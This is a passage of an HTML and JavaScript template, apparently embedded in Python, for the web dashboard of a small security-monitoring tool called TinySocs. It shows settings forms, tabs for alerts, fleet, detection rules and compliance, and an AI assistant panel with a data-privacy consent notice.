        <label>Anthropic Model</label>
        <input type="text" id="s_ANTHROPIC_MODEL" placeholder="e.g. claude-sonnet-4-20250514">
      </div>
      <div class="field" id="field_ollama">
        <label>Ollama URL</label>
        <input type="text" id="s_OFFLINE_LLM_URL" placeholder="http://localhost:11434">
        <label>Ollama Model</label>
        <input type="text" id="s_OFFLINE_LLM_MODEL" placeholder="qwen2.5:0.5b-instruct">
      </div>

      <div class="section-title">Notifications — Webhook</div>
      <div class="field">
        <label>Webhook URL (for alerts)</label>
        <input type="text" id="s_WEBHOOK_URL" placeholder="https://hooks.slack.com/...">
      </div>
      <div class="field">
        <label>Webhook Enabled</label>
        <select id="s_WEBHOOK_ENABLED">
          <option value="1">Yes</option>
          <option value="0">No</option>
        </select>
      </div>
      <div class="field">
        <button class="btn-save" onclick="testWebhook()" style="width:auto;background:var(--surface);color:var(--accent);border:1px solid var(--accent)">Test Webhook</button>
        <span id="webhookTestStatus" style="font-size:12px;margin-left:8px"></span>
      </div>

      <div class="section-title">Notifications — Email</div>
      <div class="field">
        <label>SMTP Host</label>
        <input type="text" id="s_EMAIL_SMTP_HOST" placeholder="smtp.example.com">
      </div>
      <div class="field">
        <label>SMTP Port</label>
        <input type="number" id="s_EMAIL_SMTP_PORT" placeholder="587" value="587">
      </div>
      <div class="field">
        <label>From Address</label>
        <input type="text" id="s_EMAIL_FROM" placeholder="tinysocs@example.com">
      </div>
      <div class="field">
        <label>To Address</label>
        <input type="text" id="s_EMAIL_TO" placeholder="operator@example.com">
      </div>
      <div class="field">
        <button class="btn-save" onclick="testEmail()" style="width:auto;background:var(--surface);color:var(--accent);border:1px solid var(--accent)">Test Email</button>
        <span id="emailTestStatus" style="font-size:12px;margin-left:8px"></span>
      </div>

      <div class="section-title">Threat Intelligence (Optional)</div>
      <p style="color:var(--muted);font-size:12px;margin-bottom:8px">API keys for automatic alert enrichment. Leave blank to disable a provider.</p>
      <div class="field">
        <label>AbuseIPDB API Key</label>
        <input type="text" id="s_ABUSEIPDB_API_KEY" placeholder="(free: 1,000 checks/day)">
      </div>
      <div class="field">
        <label>AlienVault OTX API Key</label>
        <input type="text" id="s_OTX_API_KEY" placeholder="(free: unlimited)">
      </div>
      <div class="field">
        <label>GreyNoise Community API Key</label>
        <input type="text" id="s_GREYNOISE_API_KEY" placeholder="(optional: 10/day unauthenticated, 50/week with key)">
      </div>
      <div class="field">
        <button class="btn-save" onclick="testThreatIntel()" style="width:auto;background:var(--surface);color:var(--accent);border:1px solid var(--accent)">Test Providers</button>
        <span id="threatIntelTestStatus" style="font-size:12px;margin-left:8px"></span>
      </div>

      <div class="section-title">Data Retention</div>
      <p style="color:var(--muted);font-size:12px;margin-bottom:8px">How long to keep data before automatic deletion (7\u2013365 days).</p>
      <div class="field" style="display:flex;gap:12px;align-items:center">
        <div style="flex:1">
          <label>Event Log Retention (days)</label>
          <input type="number" id="s_WINLOG_RETENTION_DAYS" min="7" max="365" value="30" style="width:80px">
        </div>
        <div style="flex:1">
          <label>Alert Retention (days)</label>
          <input type="number" id="s_ALERT_RETENTION_DAYS" min="7" max="365" value="90" style="width:80px">
        </div>
        <div style="flex:1">
          <label>Custom/HEC Log Retention (days)</label>
          <input type="number" id="s_CUSTOM_RETENTION_DAYS" min="7" max="365" value="30" style="width:80px">
        </div>
      </div>
      <div style="margin-top:4px">
        <button class="btn-save" onclick="saveRetentionSettings()" style="font-size:12px;padding:4px 12px">Save Retention</button>
        <span id="retentionStatus" style="font-size:12px;margin-left:8px"></span>
      </div>

      <div class="section-title">SIEM Connection</div>
      <div class="field">
        <label>SIEM URL</label>
        <input type="text" id="s_SIEM_URL" placeholder="https://localhost:9201">
      </div>
      <div class="field">
        <label>SIEM User</label>
        <input type="text" id="s_SIEM_USER" placeholder="admin">
      </div>
      <div class="field">
        <label>SIEM Password</label>
        <input type="password" id="s_SIEM_PASS" placeholder="(leave blank to keep current)">
      </div>

      <div class="section-title" style="margin-top:24px">Change Dashboard Password</div>
      <p style="color:var(--muted);font-size:12px;margin-bottom:8px">This password protects both the dashboard and the SIEM datastore.</p>
      <div class="field">
        <label>Current Password</label>
        <input type="password" id="changePwCurrent" placeholder="Current password">
      </div>
      <div class="field">
        <label>New Password</label>
        <input type="password" id="changePwNew" placeholder="New password (min 8 chars)">
      </div>
      <div class="field">
        <label>Confirm New Password</label>
        <input type="password" id="changePwConfirm" placeholder="Confirm new password">
      </div>
      <div id="changePwStatus" style="min-height:20px;margin:8px 0"></div>
      <div class="btn-row" style="margin-top:0">
        <div></div>
        <button class="btn-save" onclick="changePassword()" style="background:#e67e22">Change Password</button>
      </div>

      <div class="btn-row" style="margin-top:24px;border-top:1px solid var(--border);padding-top:16px">
        <button class="btn-cancel" onclick="closeSettings()">Cancel</button>
        <button class="btn-save" onclick="saveSettings()">Save &amp; Apply</button>
      </div>
    </div>
  </div>
</div>

<div class="tab-bar" id="tabBar">
  <button class="active" data-tab="overview" onclick="switchTab('overview')">Overview</button>
  <button data-tab="sites" onclick="switchTab('sites')" id="sitesTabBtn">Sites</button>
  <button data-tab="fleet" onclick="switchTab('fleet')">Fleet</button>
  <button data-tab="data" onclick="switchTab('data')">Data</button>
  <button data-tab="detections" onclick="switchTab('detections')">Detections</button>
  <button data-tab="compliance" onclick="switchTab('compliance')">Compliance</button>
</div>

""" + ("""
<style>
  .right-panel { top: 122px !important; }
  .tab-bar { top: 88px !important; }
  #overview-agg-banner { top: 127px !important; }
</style>
<div class="demo-banner" id="demoBanner"
     style="position:sticky; top:56px; z-index:19;">
  &#9888; Demo Mode &mdash; showing synthetic data for illustration purposes
  <button class="close-btn" onclick="document.getElementById('demoBanner').style.display='none'; document.querySelector('.right-panel').style.top='90px'; document.querySelector('.tab-bar').style.top='56px'; var ab=document.getElementById('overview-agg-banner'); if(ab) ab.style.top='95px';">&times;</button>
</div>
""" if _DEMO_MODE else "") + """

<!-- Cross-site aggregate banner (full-width, sticky below tab bar) -->
<div class="sites-aggregate" id="overview-agg-banner" style="display:none" onclick="switchTab('sites')"></div>

<div class="main-layout">
  <div class="left-panels">

    <!-- Site Focus Banner (Phase 18 M3 — drill-through mode) -->
    <div class="site-focus-banner" id="siteFocusBanner">
      <a class="sfb-back" onclick="unfocusSite()">&larr; All Sites</a>
      <span class="sfb-label" id="sfbSiteName"></span>
    </div>

    <!-- ==================== SITES TAB ==================== -->
    <div class="tab-pane" id="tab-sites">
      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px">
        <h3 style="margin:0">Managed Sites</h3>
        <div style="display:flex;align-items:center;gap:12px">
          <span id="sitesCount" style="color:var(--muted);font-size:13px"></span>
          <button onclick="askAIAboutWidget('sites')" style="padding:6px 16px;font-size:13px;border-radius:6px;background:var(--accent);color:#fff;border:none;cursor:pointer;white-space:nowrap" title="Ask the AI assistant about federation sites">Ask AI</button>
          <button onclick="showAddSiteForm()" id="addSiteBtn" style="padding:6px 16px;font-size:13px;border-radius:6px;background:var(--accent);color:#fff;border:none;cursor:pointer">+ Add Site</button>
        </div>
      </div>
      <div id="addSiteForm" style="display:none;padding:14px 16px;margin-bottom:12px;border:1px solid var(--border);border-radius:8px;background:var(--surface)">
        <div style="display:flex;gap:8px;align-items:center">
          <input type="text" id="addSiteUrl" placeholder="e.g. 192.168.1.50 or warehouse:8081" style="flex:1;padding:8px 12px;height:36px;box-sizing:border-box;border:1px solid var(--border);border-radius:6px;background:var(--card-bg);color:var(--fg);font-size:14px" onkeydown="if(event.key==='Enter')addSite()">
          <button onclick="addSite()" style="padding:0 18px;height:36px;box-sizing:border-box;border-radius:6px;background:var(--accent);color:#fff;border:1px solid transparent;cursor:pointer;font-size:13px;white-space:nowrap;display:inline-flex;align-items:center;justify-content:center">Add</button>
          <button onclick="hideAddSiteForm()" style="padding:0 14px;height:36px;box-sizing:border-box;border-radius:6px;background:transparent;color:var(--muted);border:1px solid var(--border);cursor:pointer;font-size:13px;display:inline-flex;align-items:center;justify-content:center">Cancel</button>
        </div>
        <div style="color:var(--muted);font-size:12px;margin-top:6px">Enter the IP address or hostname of the remote TinySocs Site. Port defaults to 8081 if not specified.</div>
        <div id="addSiteError" style="color:var(--red,#ef4444);font-size:13px;margin-top:4px;display:none"></div>
      </div>
      <!-- Sites tab aggregate banner (dedicated container to prevent duplication) -->
      <div id="sitesAggBanner"></div>
      <!-- Phase 21: Pending site approvals -->
      <div id="pendingSitesBanner" style="display:none;margin-bottom:12px"></div>
      <div class="sites-grid" id="sitesGrid"></div>
    </div>

    <!-- ==================== OVERVIEW TAB ==================== -->
    <div class="tab-pane active" id="tab-overview">
      <!-- Alert Summary -->
      <div class="card">
        <div class="card-header-sticky" style="display:flex;align-items:center;gap:4px">
          <h2 style="margin:0;flex:1">Alert Summary</h2>
          <button onclick="askAIAboutWidget('summary')" style="margin-left:auto;font-size:11px;padding:3px 10px;background:var(--accent);color:#fff;border:none;border-radius:4px;cursor:pointer;white-space:nowrap" title="Ask the AI assistant about this widget">Ask AI</button>
        </div>
        <div class="card-body" id="body-summary">
          <div id="summary-content"><div class="loading">Loading...</div></div>
        </div>
      </div>

      <!-- Alert Timeline -->
      <div class="card">
        <div class="card-header-sticky" style="display:flex;align-items:center;gap:4px">
          <h2 style="margin:0;flex:1">Alert Timeline</h2>
          <button onclick="askAIAboutWidget('timeline')" style="margin-left:auto;font-size:11px;padding:3px 10px;background:var(--accent);color:#fff;border:none;border-radius:4px;cursor:pointer;white-space:nowrap" title="Ask the AI assistant about this widget">Ask AI</button>
        </div>
        <div class="card-body" id="body-timeline">
          <div id="timeline-content"><div class="loading">Loading...</div></div>
        </div>
      </div>

      <!-- Storage -->
      <div class="card">
        <div class="card-header-sticky" style="display:flex;align-items:center;gap:4px">
          <h2 style="margin:0;flex:1">Storage</h2>
          <button onclick="askAIAboutWidget('storage')" style="margin-left:auto;font-size:11px;padding:3px 10px;background:var(--accent);color:#fff;border:none;border-radius:4px;cursor:pointer;white-space:nowrap" title="Ask the AI assistant about this widget">Ask AI</button>
        </div>
        <div class="card-body" id="body-storage">
          <div id="storage-content"><div class="loading">Loading...</div></div>
        </div>
      </div>

      <!-- Fired Detections (full width) -->
      <div class="card full detections-card">
        <div class="card-header-sticky" style="display:flex;align-items:center;gap:4px">
          <h2 style="margin:0;white-space:nowrap">Fired Detections</h2>
          <select id="detStatusFilter" style="font-size:12px;padding:4px 8px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:4px;max-width:200px;margin-left:8px" onchange="_detectionsPage=0;_openDetectionIdx=-1;renderDetections()">
            <option value="active" selected>Active (new + ack)</option>
            <option value="all">All</option>
            <option value="new">New only</option>
            <option value="acknowledged">Acknowledged</option>
            <option value="dismissed">Dismissed</option>
          </select>
          <button onclick="askAIAboutWidget('detections')" style="margin-left:auto;font-size:11px;padding:3px 10px;background:var(--accent);color:#fff;border:none;border-radius:4px;cursor:pointer;white-space:nowrap" title="Ask the AI assistant about this widget">Ask AI</button>
        </div>
        <div class="card-body" id="body-detections">
          <div id="detections-content"><div class="loading">Loading...</div></div>
        </div>
      </div>
    </div>

    <!-- ==================== FLEET TAB ==================== -->
    <div class="tab-pane" id="tab-fleet">
      <!-- Fleet Health (full width) -->
      <div class="card full">
        <div class="card-header-sticky" style="display:flex;align-items:center;gap:4px">
          <h2 style="margin:0;flex:1">Fleet Health</h2>
          <button onclick="askAIAboutWidget('fleet')" style="margin-left:auto;font-size:11px;padding:3px 10px;background:var(--accent);color:#fff;border:none;border-radius:4px;cursor:pointer;white-space:nowrap" title="Ask the AI assistant about this widget">Ask AI</button>
        </div>
        <div class="card-body" id="body-fleet">
          <div id="fleet-content"><div class="loading">Loading...</div></div>
        </div>
      </div>

      <!-- Event Flow (fleet-wide by default, filterable by host) -->
      <div class="card full timeline-card" id="hostTimelineCard">
        <div style="display:flex;justify-content:space-between;align-items:center">
          <h2 id="hostTimelineTitle" style="margin:0;font-size:14px;color:var(--muted);text-transform:uppercase;letter-spacing:0.5px">Event Flow</h2>
          <div class="timeline-controls" style="display:flex;gap:6px;align-items:center">
            <div class="host-picker" id="hostPickerWrap">
              <button class="host-picker-btn" id="hostPickerBtn" onclick="toggleHostPicker()" type="button">All Hosts</button>
              <div class="host-picker-menu" id="hostPickerMenu"></div>
            </div>
            <select id="hostTimelineRange" onchange="refreshHostTimeline()">
              <option value="1">1 hour</option>
              <option value="6">6 hours</option>
              <option value="24" selected>24 hours</option>
              <option value="48">48 hours</option>
              <option value="168">7 days</option>
            </select>
          </div>
        </div>
        <div id="hostTimelineChart" style="margin-top:10px"><div class="loading">Loading...</div></div>
        <div id="hostTimelineLegend" style="margin-top:8px;display:flex;flex-wrap:wrap;gap:10px;font-size:11px"></div>
      </div>
    </div>

    <!-- ==================== DATA TAB ==================== -->
    <div class="tab-pane" id="tab-data">
      <!-- Event Explorer -->
      <div class="card full" id="event-explorer-card">
        <div class="card-header-sticky" style="display:flex;align-items:center;gap:4px">
          <h2 style="margin:0;flex:1">Event Explorer</h2>
          <button onclick="askAIAboutWidget('explorer')" style="font-size:11px;padding:3px 10px;background:var(--accent);color:#fff;border:none;border-radius:4px;cursor:pointer;white-space:nowrap" title="Ask the AI assistant about this widget">Ask AI</button>
          <button style="font-size:11px;padding:2px 8px;background:var(--accent);color:#fff;border:none;border-radius:4px;cursor:pointer" onclick="toggleSchema()">Schema</button>
        </div>
        <div class="card-body" id="body-explorer">
          <div class="explorer-toolbar">
            <select id="eventIndex" onchange="loadEvents()">
              <option value="tinysocs-winlog-*">tinysocs-winlog-*</option>
              <option value="tinysocs-alerts-*">tinysocs-alerts-*</option>
            </select>
            <select id="eventTimeRange" onchange="loadEvents()">
              <option value="">All time</option>
              <option value="5m">Last 5 min</option>
              <option value="15m">Last 15 min</option>
              <option value="1h">Last 1 hour</option>
              <option value="6h">Last 6 hours</option>
              <option value="24h" selected>Last 24 hours</option>
              <option value="7d">Last 7 days</option>
            </select>
            <input type="text" id="eventQuery" placeholder="KQL filter (e.g. winlog.event_id:4625)" onkeydown="if(event.key==='Enter')loadEvents()">
            <button onclick="loadEvents()">Search</button>
            <label style="display:flex;align-items:center;gap:4px;font-size:12px;color:var(--muted);cursor:pointer;margin-left:6px;white-space:nowrap;user-select:none">
              <input type="checkbox" id="eventsLiveToggle" onchange="toggleEventsLive(this.checked)" style="accent-color:var(--accent);cursor:pointer"> Live
            </label>
          </div>
          <div id="schema-panel" style="display:none;max-height:200px;overflow-y:auto;margin-bottom:8px;padding:8px;background:var(--bg);border:1px solid var(--border);border-radius:6px;font-size:12px"></div>
          <div id="events-content" class="explorer-table-wrap"><div class="loading">Loading...</div></div>
        </div>
      </div>
    </div>

    <!-- ==================== DETECTIONS TAB ==================== -->
    <div class="tab-pane" id="tab-detections">
      <!-- Alert Rules -->
      <div class="card full rules-card" id="rules-card">
        <div class="card-header-sticky" style="display:flex;align-items:center;gap:4px">
          <h2 style="margin:0;white-space:nowrap">Alert Rules</h2>
          <select id="rulesFilter" onchange="filterRules()" style="flex:1;margin-bottom:0;height:32px;margin-left:8px">
            <option value="all">All Rules</option>
            <option value="builtin">Built-in</option>
            <option value="custom">Custom</option>
            <option value="enabled">Enabled</option>
            <option value="disabled">Disabled</option>
          </select>
          <div style="display:flex;gap:6px;align-items:center;margin-left:auto">
            <button onclick="askAIAboutWidget('rules')" style="font-size:11px;padding:3px 10px;background:var(--accent);color:#fff;border:none;border-radius:4px;cursor:pointer;white-space:nowrap" title="Ask the AI assistant about detection rules">Ask AI</button>
            <button onclick="toggleRuleBuilder()" class="rules-btn rules-btn-accent">+ New Rule</button>
            <button onclick="toggleRuleUpload()" class="rules-btn rules-btn-purple">Upload Pack</button>
          </div>
        </div>
        <div class="card-body" id="body-rules">

        <!-- Quick Rule Builder (hidden by default) -->
        <div id="ruleBuilder" style="display:none;margin-bottom:12px;padding:12px;background:var(--bg);border:1px solid var(--border);border-radius:6px">
          <div style="font-size:13px;font-weight:500;margin-bottom:10px;color:var(--text)">Create New Detection Rule</div>
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px">
            <div>
              <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:2px">Rule ID *</label>
              <input type="text" id="rb_id" placeholder="e.g. my_custom_rule" style="width:100%;box-sizing:border-box">
            </div>
            <div>
              <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:2px">Severity *</label>
              <select id="rb_severity" style="width:100%;box-sizing:border-box">
                <option value="low">Low</option>
                <option value="medium" selected>Medium</option>
                <option value="high">High</option>
                <option value="critical">Critical</option>
              </select>
            </div>
          </div>
          <div style="margin-bottom:8px">
            <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:2px">Description *</label>
            <input type="text" id="rb_desc" placeholder="What does this rule detect?" style="width:100%;box-sizing:border-box">
          </div>
          <div style="margin-bottom:8px">
            <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:2px">KQL Query *</label>
            <textarea id="rb_kql" rows="3" placeholder="e.g. winlog.event_id:4625 AND NOT winlog.event_data.IpAddress:127.0.0.1" style="width:100%;box-sizing:border-box;font-family:monospace;font-size:12px;padding:6px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:4px;resize:vertical"></textarea>
          </div>
          <div style="display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:8px;margin-bottom:10px">
            <div>
              <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:2px">Index</label>
              <input type="text" id="rb_index" value="tinysocs-winlog-*" style="width:100%;box-sizing:border-box">
            </div>
            <div>
              <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:2px">Min. events to alert</label>
              <input type="number" id="rb_threshold" value="1" min="1" style="width:100%;box-sizing:border-box" title="Alert fires when this many matching events are found in a single run">
            </div>
            <div>
              <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:2px">Category</label>
              <select id="rb_category" style="width:100%;box-sizing:border-box">
                <option value="custom">Custom</option>
                <option value="auth">Auth</option>
                <option value="powershell">PowerShell</option>
                <option value="endpoint">Endpoint</option>
                <option value="identity">Identity</option>
                <option value="persistence">Persistence</option>
                <option value="lateral">Lateral</option>
                <option value="network">Network</option>
                <option value="cloud">Cloud</option>
              </select>
            </div>
            <div>
              <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:2px">Group By <span style="opacity:0.6">(optional)</span></label>
              <input type="text" id="rb_groupby" value="" placeholder="e.g. host.name, user.name" style="width:100%;box-sizing:border-box" title="Count events per unique combination of these fields. Leave blank to count all matching events together.">
            </div>
          </div>
          <div style="display:flex;gap:8px;justify-content:flex-end">
            <button onclick="toggleRuleBuilder()" style="font-size:12px;padding:4px 14px;background:var(--bg);color:var(--muted);border:1px solid var(--border);border-radius:4px;cursor:pointer">Cancel</button>
            <button onclick="createRule()" style="font-size:12px;padding:4px 14px;background:#27ae60;color:#fff;border:none;border-radius:4px;cursor:pointer">Create Rule</button>
          </div>
          <div id="ruleBuilderMsg" style="margin-top:6px;font-size:12px;display:none"></div>
        </div>

        <!-- Rule Pack Upload (hidden by default) -->
        <div id="ruleUpload" style="display:none;margin-bottom:12px;padding:12px;background:var(--bg);border:1px solid var(--border);border-radius:6px">
          <div style="font-size:13px;font-weight:500;margin-bottom:10px;color:var(--text)">Upload Rule Pack</div>
          <p style="font-size:12px;color:var(--muted);margin:0 0 8px 0">Upload a YAML or JSON file containing a list of detection rules. Each rule needs at least: id, description, kql, severity.</p>
          <div style="display:flex;gap:8px;align-items:center;margin-bottom:8px">
            <input type="file" id="rulePackFile" accept=".yaml,.yml,.json" style="font-size:12px;color:var(--text)">
            <input type="text" id="rulePackName" placeholder="Pack name (optional)" style="width:180px">
          </div>
          <div style="display:flex;gap:8px;justify-content:flex-end">
            <button onclick="toggleRuleUpload()" style="font-size:12px;padding:4px 14px;background:var(--bg);color:var(--muted);border:1px solid var(--border);border-radius:4px;cursor:pointer">Cancel</button>
            <button onclick="uploadRulePack()" style="font-size:12px;padding:4px 14px;background:#8e44ad;color:#fff;border:none;border-radius:4px;cursor:pointer">Upload</button>
          </div>
          <div id="ruleUploadMsg" style="margin-top:6px;font-size:12px;display:none"></div>
        </div>

        <div id="rules-content"><div class="loading">Loading...</div></div>
        </div>
      </div>

      <!-- Guided Response Actions (hidden until feature is fully implemented) -->
      <div class="card full" id="actions-card" style="display:none">
        <div class="card-header-sticky" style="display:flex;align-items:center;gap:8px">
          <h2 style="margin:0;white-space:nowrap">Guided Response</h2>
          <button onclick="createTestAction()" style="margin-left:auto;font-size:11px;padding:4px 10px;background:var(--accent);color:#fff;border:none;border-radius:4px;cursor:pointer">+ Test Action</button>
        </div>
        <div class="card-body">
          <div id="actions-content"><div class="loading">Loading...</div></div>
        </div>
      </div>
    </div>

    <!-- ==================== COMPLIANCE TAB ==================== -->
    <div class="tab-pane" id="tab-compliance">
      <!-- Compliance Reports (Phase 14 M4) -->
      <div class="card full" id="compliance-card">
        <div class="card-header-sticky" style="display:flex;align-items:center;gap:4px">
          <h2 style="margin:0;white-space:nowrap">Compliance Coverage</h2>
          <select id="complianceFramework" onchange="loadComplianceReport()" style="font-size:12px;padding:4px 8px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:4px;margin-left:8px">
            <option value="">Loading frameworks...</option>
          </select>
          <select id="complianceHours" onchange="loadComplianceReport()" style="font-size:12px;padding:4px 8px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:4px">
            <option value="168">7 days</option>
            <option value="720" selected>30 days</option>
            <option value="2160">90 days</option>
          </select>
          <select id="complianceStatus" onchange="_filterCompliancePage()" style="font-size:12px;padding:4px 8px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:4px">
            <option value="">All Statuses</option>
            <option value="active">Active</option>
            <option value="deployed">Deployed</option>
            <option value="not_mapped">Not Mapped</option>
          </select>
          <button onclick="askAIAboutWidget('compliance')" style="margin-left:auto;font-size:11px;padding:0 10px;height:26px;box-sizing:border-box;display:inline-flex;align-items:center;justify-content:center;background:var(--accent);color:#fff;border:none;border-radius:4px;cursor:pointer;white-space:nowrap" title="Ask the AI assistant about this widget">Ask AI</button>
          <a id="complianceDownload" href="#" style="display:none;padding:0 8px;height:26px;box-sizing:border-box;display:inline-flex;align-items:center;justify-content:center;background:var(--accent);color:#fff;text-decoration:none;border-radius:4px;cursor:pointer" title="Download compliance report" download><span style="font-size:13px;line-height:0;position:relative;top:1px">&#x21E9;</span></a>
        </div>
        <div class="card-body" id="body-compliance">
        <div id="compliance-summary" style="display:flex;gap:12px;margin:0;overflow:hidden;max-height:0;transition:max-height 0.3s ease,margin 0.3s ease">
          <div style="background:var(--bg);padding:12px 16px;border-radius:6px;flex:1;text-align:center">
            <div id="comp-coverage" style="font-size:24px;font-weight:700;color:var(--text)">—</div>
            <div style="font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:.5px;margin-top:2px">Coverage</div>
          </div>
          <div style="background:var(--bg);padding:12px 16px;border-radius:6px;flex:1;text-align:center">
            <div id="comp-covered" style="font-size:24px;font-weight:700;color:#00b894">—</div>
            <div style="font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:.5px;margin-top:2px">Covered</div>
          </div>
          <div style="background:var(--bg);padding:12px 16px;border-radius:6px;flex:1;text-align:center">
            <div id="comp-notmapped" style="font-size:24px;font-weight:700;color:#b2bec3">—</div>
            <div style="font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:.5px;margin-top:2px">Not Mapped</div>
          </div>
          <div style="background:var(--bg);padding:12px 16px;border-radius:6px;flex:1;text-align:center">
            <div id="comp-total" style="font-size:24px;font-weight:700;color:var(--text)">—</div>
            <div style="font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:.5px;margin-top:2px">Total Controls</div>
          </div>
        </div>
        <div id="compliance-content"><div class="loading">Loading...</div></div>
        </div>
      </div>

      <!-- MITRE ATT&CK Coverage (Phase 15 M3) -->
      <div class="card full" id="mitre-card">
        <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px">
          <h2 style="margin:0">MITRE ATT&CK Coverage</h2>
          <button onclick="askAIAboutWidget('mitre')" style="margin-left:auto;font-size:11px;padding:0 10px;height:26px;box-sizing:border-box;display:inline-flex;align-items:center;justify-content:center;background:var(--accent);color:#fff;border:none;border-radius:4px;cursor:pointer;white-space:nowrap" title="Ask the AI assistant about this widget">Ask AI</button>
          <a id="mitreDownload" href="#" style="padding:0 8px;height:26px;box-sizing:border-box;display:inline-flex;align-items:center;justify-content:center;background:var(--accent);color:#fff;text-decoration:none;border-radius:4px;cursor:pointer" title="Download Navigator layer JSON" onclick="downloadNavigatorLayer(event)"><span style="font-size:13px;line-height:0;position:relative;top:1px">&#x21E9;</span></a>
        </div>
        <div class="card-body" id="body-mitre">
        <div id="mitre-summary" style="display:flex;gap:12px;margin:0;overflow:hidden;max-height:0;transition:max-height 0.3s ease,margin 0.3s ease">
          <div style="background:var(--bg);padding:12px 16px;border-radius:6px;flex:1;text-align:center">
            <div id="mitre-techniques" style="font-size:24px;font-weight:700;color:#27ae60">—</div>
            <div style="font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:.5px;margin-top:2px">Techniques</div>
          </div>
          <div style="background:var(--bg);padding:12px 16px;border-radius:6px;flex:1;text-align:center">
            <div id="mitre-tactics" style="font-size:24px;font-weight:700;color:#3498db">—</div>
            <div style="font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:.5px;margin-top:2px">Tactics</div>
          </div>
          <div style="background:var(--bg);padding:12px 16px;border-radius:6px;flex:1;text-align:center">
            <div id="mitre-rules" style="font-size:24px;font-weight:700;color:var(--text)">—</div>
            <div style="font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:.5px;margin-top:2px">Annotated Rules</div>
          </div>
        </div>
        <div id="mitre-heatmap" style="margin-top:12px"></div>
        </div>
      </div>
    </div>

  </div>

  <div class="right-panel" id="rightPanel">
    <button class="assistant-toggle" onclick="toggleAssistant()" id="assistantToggle" title="Toggle assistant panel">&laquo;</button>
    <div class="card assistant-card">
      <div class="assistant-header-inner" style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px;padding-left:28px">
        <div style="display:flex;align-items:center;gap:8px">
          <h2 style="margin:0">Assistant</h2>
          <span id="llmModeLabel" style="font-size:10px;padding:2px 6px;border-radius:3px;background:var(--bg);color:var(--muted);border:1px solid var(--border)" title=""></span>
        </div>
        <button onclick="clearChat()" style="font-size:10px;padding:2px 8px;background:var(--bg);color:var(--muted);border:1px solid var(--border);border-radius:4px;cursor:pointer" title="Start a new conversation">New Chat</button>
      </div>
      <!-- Privacy consent overlay (shown once for cloud LLM modes) -->
      <div id="llmConsentOverlay" style="display:none;position:absolute;inset:0;z-index:10;background:var(--card-bg);padding:20px;overflow-y:auto;border-radius:8px">
        <h3 style="margin:0 0 12px 0;color:var(--orange)">&#x26A0;&#xFE0F; AI Assistant &mdash; Data Privacy Notice</h3>
        <p style="font-size:13px;line-height:1.5">The AI assistant uses <strong id="consentProvider">a cloud provider</strong> to analyse your security data. When you ask a question, the following may be sent to the provider's API:</p>
        <ul style="font-size:13px;line-height:1.8;margin:8px 0">
          <li>Hostnames and IP addresses (coarsened to /24)</li>
          <li>Alert summaries and detection rule names</li>
          <li>Event metadata (event IDs, timestamps, channels)</li>
          <li>Your conversation history (last 20 messages)</li>
        </ul>
        <p style="font-size:13px;line-height:1.5">Email addresses are automatically masked. Raw event payloads are truncated to 8,000 characters per query.</p>
        <p style="font-size:13px;line-height:1.5;color:var(--muted)">For zero data export, switch to Ollama (local) in Settings.</p>
        <div style="display:flex;gap:8px;margin-top:16px">
          <button onclick="acceptLlmConsent()" style="padding:8px 16px;background:var(--accent);color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:13px">&#x2713; I understand and accept</button>
          <button onclick="declineLlmConsent()" style="padding:8px 16px;background:var(--bg);color:var(--muted);border:1px solid var(--border);border-radius:4px;cursor:pointer;font-size:13px">Use Offline Mode Instead</button>
        </div>
      </div>
      <div class="chat-container">
        <div class="chat-messages" id="chatMessages">
          <div class="chat-msg assistant">Hi! I'm your TinySocs assistant. I can help you understand alerts, search through your logs, and guide you through any security concerns. Just ask me anything in plain English — no technical knowledge needed.</div>
        </div>
        <div class="chat-input-row">
          <input type="text" id="chatInput" placeholder="Ask the assistant..." onkeydown="if(event.key==='Enter')sendChat()">
          <button class="refresh-btn" onclick="sendChat()">Send</button>
        </div>
      </div>
    </div>
  </div>
</div>


<script>
let hours = 24;
const BASE = window.location.pathname.replace(/\\/$/, '');

// ── Tab navigation ──
const _validTabs = ['overview','sites','fleet','data','detections','compliance'];
let _activeTab = 'overview';
let _initialHashTab = '';  // captures original URL hash; checked by initSitesTab
let _tabLoaded = {};

function switchTab(tabId) {
  if (!_validTabs.includes(tabId)) tabId = 'overview';
  document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.tab-bar button').forEach(b => b.classList.remove('active'));
  const pane = document.getElementById('tab-' + tabId);
  if (pane) pane.classList.add('active');
  const btn = document.querySelector('.tab-bar button[data-tab="' + tabId + '"]');
  if (btn) btn.classList.add('active');
  _activeTab = tabId;
  history.replaceState(null, '', '#' + tabId);
  // Toggle full-width aggregate banner (lives outside tab panes)
  const aggBanner = document.getElementById('overview-agg-banner');
  if (aggBanner) { aggBanner.style.display = (tabId === 'overview' && aggBanner.innerHTML.trim()) ? '' : 'none'; }
  loadTabData(tabId);
  setTimeout(alignAssistantPanel, 50);
}

function loadTabData(tabId) {
  if (_tabLoaded[tabId]) return;
  _tabLoaded[tabId] = true;
  switch(tabId) {
    case 'sites': loadSites(); break;
    case 'overview': loadSummary(); loadTimeline(); loadDetections(); loadStorage(); loadOverviewAggregate(); break;
